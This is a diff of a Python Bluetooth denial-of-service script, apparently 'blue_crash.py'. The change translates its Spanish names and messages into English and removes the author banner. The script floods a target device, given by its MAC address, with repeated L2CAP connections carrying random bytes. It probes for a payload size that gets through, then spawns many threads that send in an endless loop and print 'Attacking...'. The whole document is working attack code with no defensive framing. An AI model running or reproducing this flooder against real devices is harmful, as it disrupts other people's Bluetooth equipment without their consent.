@@ -9,52 +9,49 @@ import threading
 import random
 import string
 
-caracteres = 16
-
-print "\n\nScript DOS bluetooth by v4char"
-print "Se paciente puede tardar un poco"
+characters = 16
 
 if len(sys.argv) >= 3:
 
-   def generar(longitud):
-      return ''.join(random.choice(string.hexdigits) for i in range(longitud))
+   def generate(length):
+      return ''.join(random.choice(string.hexdigits) for i in range(length))
 
-   def bucle():
-      global caracteres
+   def loop():
+      global characters
       try:
          while 1:
             s = bluetooth.BluetoothSocket (bluetooth.L2CAP)
             s.connect((sys.argv[1] ,3))
-            buff = (generar(8).decode("hex"))*caracteres
+            buff = (generate(8).decode("hex"))*characters
             s.send(buff)
             s.close()
       except:
          s.close
                
-   def main(hilos):
+   def main(thread):
       threads = list()
-      for i in range(hilos):
-         t = threading.Thread(target=bucle)
+      for i in range(thread):
+         t = threading.Thread(target=loop)
          threads.append(t)
          t.start()
 
 
-   def obtener_longitud():
-      global caracteres
+   def get_length():
+      global characters
       while 1:
          try:
             s = bluetooth.BluetoothSocket (bluetooth.L2CAP)
             s.connect((sys.argv[1] ,3))
-            buff = (generar(8).decode("hex"))*caracteres
+            buff = (generate(8).decode("hex"))*characters
             s.send(buff)
             s.close
-            print "Atacando...\n"
+            print "Attacking...\n"
             main(int(sys.argv[2]))
          except:
-            caracteres = caracteres - 1
+            characters = characters - 1
 	
 
-   obtener_longitud()
+   get_length()
 
 else:
-   print "Error usa \"python blue_crash.py bt_mac hilos\"\n";
+   print "Error!";
